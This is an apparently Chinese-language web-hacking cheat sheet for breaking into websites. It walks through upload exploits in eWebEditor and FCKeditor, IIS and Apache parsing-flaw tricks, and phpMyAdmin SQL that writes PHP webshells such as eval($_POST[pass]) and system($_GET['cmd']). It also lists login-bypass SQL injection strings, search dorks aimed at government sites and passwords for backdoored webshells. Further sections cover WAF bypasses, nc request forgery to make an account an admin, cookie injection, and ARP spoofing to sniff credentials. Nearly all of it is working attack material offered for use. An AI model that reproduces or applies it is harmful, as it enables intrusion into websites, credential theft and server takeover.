198625<br>数据库路径：data/%23sze7xiaohu.mdb<br>遍历目录：ewebeditor/admin/upload.asp?id=16&amp;d_viewmode=&amp;dir=../<br>调用样式上传页面：ewebeditor/ewebeditor.htm?id=body&amp;style=popup<br>( ewebeditor3.8 php版本 )<br>默认后台：eWebEditor/admin/login.php<br>首先随便输入一个帐号和密码，接着系统会提示出错，这时清空浏览器的url，然后输入以下代码后连按三次回车键：<br>javascript:alert(document.cookie=”adminuser=”+escape(”admin”));javascript:alert(document.cookie=”adminpass=”+escape(”admin”));javascript:alert(document.cookie=”admindj=”+escape(”1”));<br>接着访问文件：ewebeditor/admin/default.php 就可以直接进入后台了。<br>( ewebeditor编辑器exp手册 )<br>有时候什么后缀都上传了，还是不行。就增加一个asp:jpg格式 上传asp:jpg 试试<br>一：文件上传成功了，但是访问不成功，说明该目录(比如：/UploadFile)被设置了权限，返回去换成/ 上传到根目录就行了.增加asp等不行的时候，可以利用解析asp;jpg<br>二：下载数据库查看前人留下的痕迹，再访问上传页面拿shell。</p>
+<h1 id="页面路径：-ewebeditor-asp-id-48-amp-style-popu7-用工具浏览数据库找到已添加asp-asa-cer-php的栏目，把S-ID跟S-Name的值替换在语句里访问，上传相对应的格式木马。"><a href="#页面路径：-ewebeditor-asp-id-48-amp-style-popu7-用工具浏览数据库找到已添加asp-asa-cer-php的栏目，把S-ID跟S-Name的值替换在语句里访问，上传相对应的格式木马。" class="headerlink" title="页面路径：/ewebeditor.asp?id=48&amp;style=popu7 用工具浏览数据库找到已添加asp|asa|cer|php的栏目，把S_ID跟S_Name的值替换在语句里访问，上传相对应的格式木马。"></a>页面路径：/ewebeditor.asp?id=48&amp;style=popu7 用工具浏览数据库找到已添加asp|asa|cer|php的栏目，把S_ID跟S_Name的值替换在语句里访问，上传相对应的格式木马。</h1><p>【 fckeditor编辑器 】<br>查看版本：fckeditor/editor/dialog/fck_about.html<br>编辑器页面：FCKeditor/_samples/default.html<br>上传页面：fckeditor/editor/filemanager/connectors/test.html<br>遍历目录：FCKeditor/editor/filemanager/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=File&amp;CurrentFolder=/<br>编辑页面：fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/asp/connector.asp<br>查看文件上传路径：fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=<br>( 拿shell方法总结 )<br>ASPX的站几乎都用fck编辑器，建议用工具扫一下，记住inc目录下可能存在fck编辑器，扫下这个目录。<br>一：如果是iis6.0，上传两次 1.asp;.jpg 或者1.asp;1.jpg 或者创建x.asp目录，再在这个目录下上传x.jpg 或者直接上传1.asp;jpg 都可以完美解析拿下shell<br>二：第一次上传1.asp;1.jpg，被重命名为：1_asp;1.jpg，但是第二次上传1.asp;1.jpg，就有可能变成：1.asp;1(1).jpg<br>三：iis7.5+fck的解析文件为：a.aspx.a;.a.aspx.jpg..jpg.aspx<br>四：如果不是iis6.0 上传1.asp;jpg然后抓包，接下来改包，将分号变成空格，再用c32把20改成00，保存，利用%00 截断分号两次<br>五：成功访问别人的一句话木马页面，<a href="http://xx.com/UploadFiles\EditorFile\file/2.asp;2(1).jpg" target="_blank" rel="external">http://xx.com/UploadFiles\EditorFile\file/2.asp;2(1).jpg</a> 但不知道密码<br><a href="http://xx.com/UploadFiles\EditorFile\file\2_asp;2.jpg" target="_blank" rel="external">http://xx.com/UploadFiles\EditorFile\file\2_asp;2.jpg</a> 这个是图片木马，没有成功利用iis6.0解析漏洞还是图片，下载下来用记事本打开找到密码。<br>六：IIS7.0/7.5 通杀oday，把php一句话木马后缀改成1.jpg传上去，找出一句话的路径后，在1.jpg的后面添加/.php 例如：/.php<br>( 建立文件夹 . 变 _ 的突破方法 )<br>利用Fiddler web debugger 这款工具来进行修改数据包，从而达到突破的目的。<br>注意：安装Fiddler web debugger，需要安装.net环境以及.net的SP2补丁方可运行！<br>1.打开fck的上传页面，例如：fckeditor/editor/filemanager/browser/default/connectors/test.html<br>2.再打开Fiddler web debugger这款工具，点击设置–自动断点–选择 “请求之前”<br>3.接着打开fck的上传页面，创建文件夹，并输入你想要创建的文件名，例如：x.asp<br>4.然后返回到Fiddler web debugger这款工具里，选择链接–点击右侧的嗅探<br>5.修改currentfolder内的参数，改成你要建立的文件夹名字，如：x.asp<br>6.然后点击右侧的：run to completion</p>
+<h1 id="7-再点击软件设置–自动断点–禁用，再到浏览器里点击确定建立文件夹，你就会发现文件夹建立为x-asp了"><a href="#7-再点击软件设置–自动断点–禁用，再到浏览器里点击确定建立文件夹，你就会发现文件夹建立为x-asp了" class="headerlink" title="7.再点击软件设置–自动断点–禁用，再到浏览器里点击确定建立文件夹，你就会发现文件夹建立为x.asp了"></a>7.再点击软件设置–自动断点–禁用，再到浏览器里点击确定建立文件夹，你就会发现文件夹建立为x.asp了</h1><p>【 linux 】<br>解析格式：1.php.xxx (xxx可以是任意)<br>如果apache不认识后缀为rar的文件，我们就用1.php.rar格式上传，文件就会被服务器当做PHP脚本解析。</p>
+<h1 id="辨别linux系统方法，例如：http-www-xxx-com-xxx-abc-asp-id-125-把b换成大写B访问，如果出错了，就说明是linux系统，反之是windows系统"><a href="#辨别linux系统方法，例如：http-www-xxx-com-xxx-abc-asp-id-125-把b换成大写B访问，如果出错了，就说明是linux系统，反之是windows系统" class="headerlink" title="辨别linux系统方法，例如：http://www.xxx.com/xxx/abc.asp?id=125 把b换成大写B访问，如果出错了，就说明是linux系统，反之是windows系统."></a>辨别linux系统方法，例如：<a href="http://www.xxx.com/xxx/abc.asp?id=125" target="_blank" rel="external">http://www.xxx.com/xxx/abc.asp?id=125</a> 把b换成大写B访问，如果出错了，就说明是linux系统，反之是windows系统.</h1><p>【 旁注 】<br>旁注的技巧就是挑选支持aspx的站来日，这样提权时候希望较大，如何探测服务器上哪些站点支持aspx呢? 利用bing搜索：<a href="http://cn.bing.com/" target="_blank" rel="external">http://cn.bing.com/</a> 搜索格式：ip:服务器ip aspx</p>
+<h1 id="比如要入侵一个网站，想知道该网站支不支持aspx，就在网站后面随便加上一个xxx-aspx回车，如果显示的不是iis默认的错误页面，而是这种：“-”应用程序中的服务器错误，说明支持aspx马。"><a href="#比如要入侵一个网站，想知道该网站支不支持aspx，就在网站后面随便加上一个xxx-aspx回车，如果显示的不是iis默认的错误页面，而是这种：“-”应用程序中的服务器错误，说明支持aspx马。" class="headerlink" title="比如要入侵一个网站，想知道该网站支不支持aspx，就在网站后面随便加上一个xxx.aspx回车，如果显示的不是iis默认的错误页面，而是这种：“/”应用程序中的服务器错误，说明支持aspx马。"></a>比如要入侵一个网站，想知道该网站支不支持aspx，就在网站后面随便加上一个xxx.aspx回车，如果显示的不是iis默认的错误页面，而是这种：“/”应用程序中的服务器错误，说明支持aspx马。</h1><p>【 phpmyadmin 】<br>查看版本：test.php 或 phpinfo.php<br>默认账号密码：root root<br>万能帐号密码：’localhost’@’@” 密码空<br>拿shell第一种方法：<br>CREATE TABLE mysql.darkmoon (darkmoon1 TEXT NOT NULL );<br>INSERT INTO mysql.darkmoon (darkmoon1 ) VALUES (‘&lt;?php @eval($_POST[pass]);?&gt;’);<br>SELECT darkmoon1 FROM darkmoon INTO OUTFILE ‘d:/wamp/www/darkmoon.php’;<br>DROP TABLE IF EXISTS darkmoon;<br>拿shell第二种方法：<br>Create TABLE moon (darkmoon text NOT NULL);<br>Insert INTO moon (darkmoon) VALUES(‘&lt;?php @eval($_POST[pass]);?&gt;’);<br>select darkmoon from moon into outfile ‘d:/wamp/www/darkmoon2.php’;<br>Drop TABLE IF EXISTS moon;<br>拿shell第三种方法：<br>select ‘&lt;?php @eval($_POST[pass]);?&gt;’INTO OUTFILE ‘d:/wamp/www/darkmoon3.php’<br>拿shell第四种方法<br>select ‘&lt;?php echo \’<pre>\’;system($_GET[\’cmd\’]); echo \’</pre>\’; ?&gt;’ INTO OUTFILE ‘d:/wamp/www/darkmoon4.php’<br>127.0.0.1/darkmoon4.php?cmd=net user<br>找到mysql数据库，执行sql语句即可写入一句话，再菜刀连接即可。<br>phpmyadmin脱裤：在这里面是可以直接拖库的，如同上传php拖库脚本一样，操作差不多的。<br>修改mysql默认的root用户名方法:<br>进入phpmyadmin,进入mysql表,执行sql语句<br>1.update user set user=’你的新root用户名’ where user=’root’;<br>2.flush privileges;<br>例如：<br>用root身份登入，进入mysql库，修改user表即可。<br>1.use mysql;<br>2.mysql&gt;update user set user=’newName’ where user=’root’;</p>
+<h1 id="3-mysql-gt-flush-privileges"><a href="#3-mysql-gt-flush-privileges" class="headerlink" title="3.mysql&gt; flush privileges;"></a>3.mysql&gt; flush privileges;</h1><p>【 万能密码 】<br>( php )<br>帐号：’ UNION Select 1,1,1 FROM admin Where ”=’<br>密码：1<br>( asp )<br>‘xor<br>‘or’=’or’<br>‘or”=”or”=’<br>‘or ‘1’=’1’or ‘1’=’1</p>
+<h1 id="‘or-1-1"><a href="#‘or-1-1" class="headerlink" title="‘or 1=1/*"></a>‘or 1=1/*</h1><p>【 批量关键词 】<br>inurl:asp?id=<br>inurl:detail.php?<br>CompHonorBig.asp?id= 很不错的的一个搜索注入点<br>inurl:show.asp? 非常强大<br>site:www.yuming.com<br>inurl:articleshow.asp?articleid=数字<br>inurl:szwyadmin/login.asp<br>inurl:asp?id=1 intitle:政府</p>
+<h1 id="杭州-inurl-Article-Class2-asp"><a href="#杭州-inurl-Article-Class2-asp" class="headerlink" title="杭州 inurl:Article_Class2.asp?"></a>杭州 inurl:Article_Class2.asp?</h1><p>【 木马后门 】<br>1.TNTHK小组内部版 —— 存在关键词后门，随便输入一个错的密码，右键查看源文件，找到错误关键词后面的font，在font后面的就是正确密码。<br>2.不灭之魂—不死僵尸变种 —— 用这款工具专门爆这款大马的密码：爆不灭之魂密码</p>
+<h1 id="3-终极防删免杀多功能VIP版本-无后门-——-万能密码：wbgz-菜刀连接：kk"><a href="#3-终极防删免杀多功能VIP版本-无后门-——-万能密码：wbgz-菜刀连接：kk" class="headerlink" title="3.终极防删免杀多功能VIP版本-无后门 —— 万能密码：wbgz 菜刀连接：kk"></a>3.终极防删免杀多功能VIP版本-无后门 —— 万能密码：wbgz 菜刀连接：kk</h1><p>【 安全狗 】<br>1.过注入<br>方法一：a.asp?aaa=%00&amp;id=sql语句<br>方法二： a.asp?id=sql语句 里面把安全过滤的加个%l 比如： un%aion sel%aect 1,2,3,4 fr%aom admin<br>2.过大马被阻拦访问<br>方法一：上传一个大马 然后访问<a href="http://sss.com/dama.asp" target="_blank" rel="external">http://sss.com/dama.asp</a> ; 访问后出现拦截。<br>那么解决方法 先将dama.asp改名dama.jpg上传，然后在同目录上传个文件da.asp 内容为： &lt;!–#include file=”dama.jpg” –&gt; 这样再访问da.asp 就不会被拦截了。<br>3.过菜刀连接一句话被拦截<br>方法一：不用菜刀连接一句话，用别的一句话连接端。</p>
+<h1 id="方法二：中转下连接菜刀，把过滤掉的词替换掉。"><a href="#方法二：中转下连接菜刀，把过滤掉的词替换掉。" class="headerlink" title="方法二：中转下连接菜刀，把过滤掉的词替换掉。"></a>方法二：中转下连接菜刀，把过滤掉的词替换掉。</h1><p>【 本地构造上传漏洞 】<br>寻找程序上传漏洞，必须从上传页面的源文件入手，目标有两个：<br>1.filename (文件名称) 在上传页面中针对文件扩展名过滤不严，从而上传可执行的脚本木马。<br>2.filepath (文件路径) 在上传页面针对路径过滤不严，导致可以修改上传相对路径上传脚本木马。<br>当检测到一个上传页面，asp、asa后缀已经被过滤掉的时候，可以尝试抓包明小子或NC上传！<br>不行就利用本地上传漏洞构造上传！例如上传页面是：<a href="http://www.xx.com/upfile_other.asp" target="_blank" rel="external">http://www.xx.com/upfile_other.asp</a><br>1.右键查看源文件，找到这段代码：<form name="”form1″" method="”past”" action="”zwhua_upload1.asp”" enctype="”multipart/form-data”"><br>把以上代码中actino处的路径补全！即：<form name="”form1″" method="”past”" action="”http://www.xxx.com/zwhua_upload1.asp”" enctype="”multipart/form-data”"><br>2.再找到这段代码：<input type="”hidden”" name="”filepath”" value="”uploadfile/”"><br>利用IIS6.0解析漏洞，把以上代码中value处的文件补全！即：<input type="”hidden”" name="”filepath”" value="”uploadfile/1.asa;" “=""> 注意：冒号后面有空格！<br>3.接着保存为1.html，将刚保存的文件拖进去C32里，选择十六进制模式，找到“1.asa; ”后面的空格，将其填充为00后保存退出！</form></form></p>
+<h1 id="4-本地打开上传图片格式的木马-不成功时可以尝试上传一句话木马-，如果提示成功后不显示路径的话，可以右键查看源文件自己手工找出路径访问即可！"><a href="#4-本地打开上传图片格式的木马-不成功时可以尝试上传一句话木马-，如果提示成功后不显示路径的话，可以右键查看源文件自己手工找出路径访问即可！" class="headerlink" title="4.本地打开上传图片格式的木马(不成功时可以尝试上传一句话木马) ，如果提示成功后不显示路径的话，可以右键查看源文件自己手工找出路径访问即可！"></a>4.本地打开上传图片格式的木马(不成功时可以尝试上传一句话木马) ，如果提示成功后不显示路径的话，可以右键查看源文件自己手工找出路径访问即可！</h1><p>【 利用双文件上传拿shell 】<br>因为网站只判断一次，如果第一个文件后缀是在白名单里面的话，就让其上传，并没有判断第二个文件，所以上传任意格式的文件也让其通过。<br>当系统验证cookie的时候，就要用到火狐浏览器了，登录网站进后台，让火狐浏览器保存管理员的cookie值，再把修改后的“双文件上传工具”拖进去上传。<br>1.在后台找上传点，右键查看源文件，找到上传地址，一般在post或action的附近，搜索即可找到，一般为：src=”../xxx.htm” 之后补全路径访问。<br>2.这个还不是真正的上传页面，真正的上传页面后缀是asp的，继续查看源代码，找到action=”xxx.asp”，补全路径访问即可！<br>4.其实也可以抓包从而获得上传路径，抓包之后，在Referer:这栏，还有常见的是：htto://www.xxxx.com/upfile_other.asp</p>
+<h1 id="3-打开双文件上传工具，替换为当前的上传地址，保存后拖进火狐浏览器里，第一个选择jpg木马，第二个选择cer木马，提交后右键查看源文件找出路径即可。"><a href="#3-打开双文件上传工具，替换为当前的上传地址，保存后拖进火狐浏览器里，第一个选择jpg木马，第二个选择cer木马，提交后右键查看源文件找出路径即可。" class="headerlink" title="3.打开双文件上传工具，替换为当前的上传地址，保存后拖进火狐浏览器里，第一个选择jpg木马，第二个选择cer木马，提交后右键查看源文件找出路径即可。"></a>3.打开双文件上传工具，替换为当前的上传地址，保存后拖进火狐浏览器里，第一个选择jpg木马，第二个选择cer木马，提交后右键查看源文件找出路径即可。</h1><p>【 数据库备份抓包改包NC提交拿shell 】<br>当备份路径不能修改,后缀又是mdb不变的时候，我们可先对备份的过程进行抓包，再本地构造用NC提交即可突破备份，数据库恢复也可使用此方法！<br>在抓包的时候，最好用火狐浏览器，因为有的浏览器抓不到包，首先上传一张图片木马复制下地址，接着对备份过程进行抓包！把抓到的数据复制在文本里面！<br>开始本地修改，先把POST处补全网址，找到最底下的一行数据，再复制多一行对比长度进行修改，把备份的数据名称替换为木马地址，备份的名称改为自己想要的asp后缀！</p>
+<h1 id="再将原来的数据长度跟现在的对比同时替换掉，最后看一共增加了多少个字符，就在Content-Length-处进行增减，用NC提交数据格式：nc-域名-80-lt-1-txt"><a href="#再将原来的数据长度跟现在的对比同时替换掉，最后看一共增加了多少个字符，就在Content-Length-处进行增减，用NC提交数据格式：nc-域名-80-lt-1-txt" class="headerlink" title="再将原来的数据长度跟现在的对比同时替换掉，最后看一共增加了多少个字符，就在Content-Length:处进行增减，用NC提交数据格式：nc 域名 80&lt;1.txt"></a>再将原来的数据长度跟现在的对比同时替换掉，最后看一共增加了多少个字符，就在Content-Length:处进行增减，用NC提交数据格式：nc 域名 80&lt;1.txt</h1><p>【 本地构造数据库备份突破拿shell 】<br>当上传jpg木马得到路径前去备份时，发现数据库备功能用不了的情况下，可以尝试本地构造突破拿shell！<br>首先查看源文件，找到“当前数据库路径”修改为刚上传jpg木马的路径，再找到“数据库备份名称”修改为1.asa<br>找到“<form method="”past”" action="”Backup.asp?action=Backup”">” 将路径补全“<form method="”past”" action="”http://xxx.com/admin/Backup.asp?action=Backup”">”<br>最后保存为1.html，有的网站不验证cookie的话，直接打开进行备份就能成功了，但是一般都需要验证cookie，这时就用上火狐浏览器了。</form></form></p>
+<h1 id="因为火狐浏览器有保留cookie的功能，先登录后台，以管理员的权限进行上传，直接把1-html拖进火狐浏览器里，直接点击备份即可突破cookie验证！"><a href="#因为火狐浏览器有保留cookie的功能，先登录后台，以管理员的权限进行上传，直接把1-html拖进火狐浏览器里，直接点击备份即可突破cookie验证！" class="headerlink" title="因为火狐浏览器有保留cookie的功能，先登录后台，以管理员的权限进行上传，直接把1.html拖进火狐浏览器里，直接点击备份即可突破cookie验证！"></a>因为火狐浏览器有保留cookie的功能，先登录后台，以管理员的权限进行上传，直接把1.html拖进火狐浏览器里，直接点击备份即可突破cookie验证！</h1><p>【 本地构造限制上传类型漏洞 】<br>一般用于直接扫到的上传页面，名称是：上传图片，上传asp、asa等脚本时提示“请选择jpg或gif文件!”<br>这时通过这个方法一般都能成功，首先保存到本地1.asp 放到小旋风的目录下，然后找到以下这段代码：<br>alert(“请点击浏览按钮，选择您要上传的jpg或gif文件!”)<br>myform.file1.focus;<br>return (false);<br>}<br>else<br>{<br>str= myform.file1.value;<br>strs=str.toLowerCase();<br>lens=strs.length;<br>extname=strs.substring(lens-4,lens);<br>if(extname!=”.jpg” &amp;&amp; extname!=”.gif”)<br>{<br>alert(“请选择jpg或gif文件!”);<br>看到这句代码：if(extname!=”.jpg” &amp;&amp; extname!=”.gif”) 改为： if(extname!=”.jpg” &amp;&amp; extname!=”.gif” &amp;&amp; extname!=”.asp”)</p>
+<h1 id="然后补充完整上传地址，action-这里，然后网页打开127-0-0-1-直接上传asp文件就可以了。"><a href="#然后补充完整上传地址，action-这里，然后网页打开127-0-0-1-直接上传asp文件就可以了。" class="headerlink" title="然后补充完整上传地址，action=这里，然后网页打开127.0.0.1 直接上传asp文件就可以了。"></a>然后补充完整上传地址，action=这里，然后网页打开127.0.0.1 直接上传asp文件就可以了。</h1><p>【 抓包改包NC提交拿shell 】<br>1.抓包数据中如果存在name=”filepath”或是name=”filename”，那么就可以满足NC的上传条件了。<br>2.将木马的抓包数据复制到文本文件中。例如：1.txt<br>3.将路径补全：<br>filepath截断法：<br>uploadfile/路径后添加1.asp空格 (16进制下面将20改为00)<br>filename自定义名称：<br>C:\Documents and Settings\lei\桌面\1.jpg (将1.jpg 改为 1.asp空格，16进制下将20改为00)<br>3.在Content-Length处加上../uploadfile/后增加的字节数。<br>4.用C32将空格的20改为00，保存为1.txt。<br>5.把1.txt跟nc.exe放在同一目录下，cmd命令：nc -vv www.XXXX.com 80&lt;1.txt</p>
+<h1 id="如果上传成功后没有将木马解析成asp，可以尝试将文件名改成asa、cer、php-再不行就用IIS-6-0解析漏洞，将文件名改为1-asa-1-jpg"><a href="#如果上传成功后没有将木马解析成asp，可以尝试将文件名改成asa、cer、php-再不行就用IIS-6-0解析漏洞，将文件名改为1-asa-1-jpg" class="headerlink" title="( 如果上传成功后没有将木马解析成asp，可以尝试将文件名改成asa、cer、php 再不行就用IIS 6.0解析漏洞，将文件名改为1.asa;1.jpg )"></a>( 如果上传成功后没有将木马解析成asp，可以尝试将文件名改成asa、cer、php 再不行就用IIS 6.0解析漏洞，将文件名改为1.asa;1.jpg )</h1><p>【 抓包nc上传获取管理权限 】<br>这个方法相当于cookie欺骗，首先到前台去注册一个会员，注册成功后在登录的那一刻，用抓包工具进行抓包，把抓到的数据复制到1.txt里面。<br>接下来打开，把双引号里棉的数据“X-Forwarded-For: 127.0.0.2’,group_id = 1 where loginname = ‘会员的帐号’#” 放在Content-Length：的下面。<br>在看到最底下的loginname=这行代码，把最后面的验证码改成当前会员登陆的验证码，然后将nc\1.txt 放在同一个目录下，cmd命令：nc 域名 80&lt;1.txt</p>
+<h1 id="成功提交上去后，刚才的会员帐户将变成管理员帐户了，找到该站的后台地址登录即可实现cookie欺骗！"><a href="#成功提交上去后，刚才的会员帐户将变成管理员帐户了，找到该站的后台地址登录即可实现cookie欺骗！" class="headerlink" title="成功提交上去后，刚才的会员帐户将变成管理员帐户了，找到该站的后台地址登录即可实现cookie欺骗！"></a>成功提交上去后，刚才的会员帐户将变成管理员帐户了，找到该站的后台地址登录即可实现cookie欺骗！</h1><p>【 cookie欺骗 】<br>当我们通过注入或是社工把管理员的帐号跟md5密码搞到手的时候，却发现破解不出密码 (MD5是16位加密的)</p>
+<h1 id="那么我们就可以用COOKIE欺骗来绕过，利用桂林老兵的cookie欺骗工具，把自己的ID以及md5密码都修改成管理员的，再修改cookie，访问时就会实现欺骗了。"><a href="#那么我们就可以用COOKIE欺骗来绕过，利用桂林老兵的cookie欺骗工具，把自己的ID以及md5密码都修改成管理员的，再修改cookie，访问时就会实现欺骗了。" class="headerlink" title="那么我们就可以用COOKIE欺骗来绕过，利用桂林老兵的cookie欺骗工具，把自己的ID以及md5密码都修改成管理员的，再修改cookie，访问时就会实现欺骗了。"></a>那么我们就可以用COOKIE欺骗来绕过，利用桂林老兵的cookie欺骗工具，把自己的ID以及md5密码都修改成管理员的，再修改cookie，访问时就会实现欺骗了。</h1><p>【 cookie中转突破防注入 】<br>有时检测一个网站，系统会弹出一些SQL防注入的提示框，这时我们可以利用COOKIE中转注入来进行突破，首先准备一个webshell，然后打开COOKIE中转工具。<br>复制注入点到“注入URL地址跟来源页”处，把问号去掉，再把问号后面的ID=剪切到“注入键名”里，再把ID=后面那个参数剪切到“POST提交值”里替换jmdcw=后面的参数。<br>点击生成，再把生成的文件上传到webshell里，然后访问路径，再页面地址后面加“?jmdcw=参数”，这样搭建构造出来的注入点就绕过防注入了！<br>以上是在webshell里搭建ASP坏境的方法，下面的是本地架设ASP环境的方法：</p>
+<h1 id="利用简易IIS服务器搭建一个环境，再将COOKIE中转生成的文件放到简易IIS服务器的目录下！然后运行简易IIS服务器，在后面-文件名-问号-jmdcw-参数即可。"><a href="#利用简易IIS服务器搭建一个环境，再将COOKIE中转生成的文件放到简易IIS服务器的目录下！然后运行简易IIS服务器，在后面-文件名-问号-jmdcw-参数即可。" class="headerlink" title="利用简易IIS服务器搭建一个环境，再将COOKIE中转生成的文件放到简易IIS服务器的目录下！然后运行简易IIS服务器，在后面+文件名+问号+jmdcw=参数即可。"></a>利用简易IIS服务器搭建一个环境，再将COOKIE中转生成的文件放到简易IIS服务器的目录下！然后运行简易IIS服务器，在后面+文件名+问号+jmdcw=参数即可。</h1><p>【 cookie手工突破防注入 】<br>第一种方法：<br>用 and 1=1 and 1=2 检测网站是否存在注入点时，如果提示你的IP已被记录，就说明系统做了防注入措施，可以用代码来突破。<br>管理员只过滤了and，但是没有过滤or，我们可以先猜网站的字段数 格式：order by 数字 猜到错为止，然后选前一个对的数字！<br>比如猜到14错误，那就是13了，然后利用Cookie提交变量值，代码：javascript:alert(document.cookie=id=”+escape(“这里填写变量值，例如：id=408”));<br>开始猜解表段，代码：javascript:alert(document.cookie=”id=”+escape(“变量值 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13 from admin”));<br>复制在浏览器里打开，将出现一个提示框，点击确定就会注射进去，再重新打开网站（要在此处打开，所以前面最好复制下网站地址）<br>然后就会出现两个提示数字，比如5跟6，然后在代码的5跟6处猜帐号密码，常见的帐号有：user username 密码:pass password<br>复制修改后的代码放到浏览器里打开，就会爆破出网站的帐号密码了。<br>第二种方法：<br>注入点：<a href="http://www.XXXXXXXX.gov.cn/shownews.asp?id=4098" target="_blank" rel="external">http://www.XXXXXXXX.gov.cn/shownews.asp?id=4098</a><br>首先把?id=408去掉，然后访问如果提示“数据库出错”！就说明网站没有过滤Cookie提交方式，可以利用Cookie欺骗绕过防注入！<br>利用Cookie提交变量值，代码：javascript:alert(document.cookie=”id=”+escape(“4098”)<br>下面开始在Cookie注入中执行常规注入攻击，提交代码：javascript:alert(document.cookie=”id=”+escape(“4098 and 1=1”));<br>访问<a href="http://www.XXXXXXXX.gov.cn/shownews.asp" target="_blank" rel="external">http://www.XXXXXXXX.gov.cn/shownews.asp</a> 显示正常页面，<br>再提交代码：javascript:alert(document.cookie=”id=”+escape(“4098 and 1=2”)); 显示错误页面！<br>下面来开始猜解表段，提交代码：javascript:alert(document.cookie=”id=”+escape(“4098 and exists (select * from 表段)”))；<br>接着猜字段，提交代码：javascript:alert(document.cookie=”id=”+escape(“4098 and exists (select 字段 from admin)”))； 例如：username<br>接着猜字段，提交代码：javascript:alert(document.cookie=”id=”+escape(“4098 and exists (select 字段 from admin)”)), 例如：password<br>下面开始猜字段数跟字段内容了，提交代码:javascript:alert(document.cookie=”id=”+escape(“4098 and 1=2 union select 1,2,3,4,5,6 from 表段”));<br>一直猜解到对为止，这里只是猜到6，记得继续加减！猜解到对的时候，页面会出现数字，然后在相对应的数字替换字段名，再进行提交代码！</p>
+<h1 id="这时如果字段名猜对的话，就会爆出帐号密码了，不对的话继续替换字段名，位置不变！（存在cookie注入时建议参考mysql手工注入的语句）"><a href="#这时如果字段名猜对的话，就会爆出帐号密码了，不对的话继续替换字段名，位置不变！（存在cookie注入时建议参考mysql手工注入的语句）" class="headerlink" title="这时如果字段名猜对的话，就会爆出帐号密码了，不对的话继续替换字段名，位置不变！（存在cookie注入时建议参考mysql手工注入的语句）"></a>这时如果字段名猜对的话，就会爆出帐号密码了，不对的话继续替换字段名，位置不变！（存在cookie注入时建议参考mysql手工注入的语句）</h1><p>【 伪静态注入 】<br>伪静态网站注入方法，通常情况下，动态脚本的网站的url类似下面这样：<br><a href="http://www.91ri.org/news.php?id=111" target="_blank" rel="external">http://www.91ri.org/news.php?id=111</a><br>做了伪静态之后就成这样了：<br><a href="http://www.91ri.org/news.php/id/111.html" target="_blank" rel="external">http://www.91ri.org/news.php/id/111.html</a><br>以斜杠“/”代替了“=”并在最后加上.html，这样一来，就无法直接用工具来注入了。<br>常规的伪静态页面如下：<a href="http://www.XXX.com/play/Diablo.html" target="_blank" rel="external">http://www.XXX.com/play/Diablo.html</a><br>例如关联的动态页面是game.php ，那么当用户访问后程序会自动转换成类似<a href="http://www.XXX.com/game.php?action=play&amp;name=Diablo" target="_blank" rel="external">http://www.XXX.com/game.php?action=play&amp;name=Diablo</a> 的形式<br>注入点检测可以用：<a href="http://www.XXX.com/play/Diablo’" target="_blank" rel="external">http://www.XXX.com/play/Diablo’</a> and 1=’1.html与<a href="http://www.XXX.com/play/Diablo’" target="_blank" rel="external">http://www.XXX.com/play/Diablo’</a> and 1=’2.html来判断<br>通常情况下，动态脚本的网站的url类似下面这样：<a href="http://www.xxoo.net/aa.php?id=123" target="_blank" rel="external">http://www.xxoo.net/aa.php?id=123</a></p>
+<h1 id="做了伪静态之后类似这样：http-www-xxoo-net-aa-php-id-123-html-以斜杠“-”代替了“-”并在最后加上-html，这样一来，就无法直接用工具来注入了！"><a href="#做了伪静态之后类似这样：http-www-xxoo-net-aa-php-id-123-html-以斜杠“-”代替了“-”并在最后加上-html，这样一来，就无法直接用工具来注入了！" class="headerlink" title="做了伪静态之后类似这样：http://www.xxoo.net/aa.php/id/123.html 以斜杠“/”代替了“=”并在最后加上.html，这样一来，就无法直接用工具来注入了！"></a>做了伪静态之后类似这样：<a href="http://www.xxoo.net/aa.php/id/123.html" target="_blank" rel="external">http://www.xxoo.net/aa.php/id/123.html</a> 以斜杠“/”代替了“=”并在最后加上.html，这样一来，就无法直接用工具来注入了！</h1><p>【 嗅探 】<br>当入侵一个网站，该网站没有任何漏洞的情况下，可以进行旁注，再提权拿下任意一台服务器，不行的话就C段，提权拿下任意一台服务器。<br>只要能拿下同网段的任意一台服务器，就可以使用C段嗅探来获取主站的帐号密码，cain是一款强大的劫持工具。<br>在服务器里安装cain后打开主控端，点击配置-&gt;选择服务器IP一项-&gt;在路由追踪一项取消全部-&gt;确定。<br>设置完毕后点击一下激动按钮(中间那个)，再点击嗅探器，点击加号符号，选择所有在子网主机，选择ARP测试(传播 31-位)，确定。<br>扫描完毕选择网关一项，点击ARP，点击加号符号，左边选择网关，右边选择全部的C段，确定，点击开始嗅探按钮(第三个)，嗅探到的帐号密码在口令一项展现！</p>
+<h1 id="如果发现没数据可以使用幻境网盾来限制网速，让cain的发包快过防火墙。"><a href="#如果发现没数据可以使用幻境网盾来限制网速，让cain的发包快过防火墙。" class="headerlink" title="如果发现没数据可以使用幻境网盾来限制网速，让cain的发包快过防火墙。"></a>如果发现没数据可以使用幻境网盾来限制网速，让cain的发包快过防火墙。</h1><p>【 arp欺骗 】<br>只要该服务器存在C段，都可以尝试arp欺骗，用到的工具是NetFuke，想知道arp劫持能不能成功，cmd命令：arp -a 看一下，动态的服务器IP就能成功，静态的就不能。<br>安装完运行主控端，设置–嗅探设置–网卡选择服务器的IP–控制选项选择“启用ARP欺骗、启用过滤器、启用分析器、启用修改器、主动转发” 确定。<br>设置–ARP欺骗–双向欺骗–来源Ip填服务器的网关–中间人IP填服务器的IP–目标IP填要欺骗的任意C段ip(用御剑扫描C段)–确定。</p>
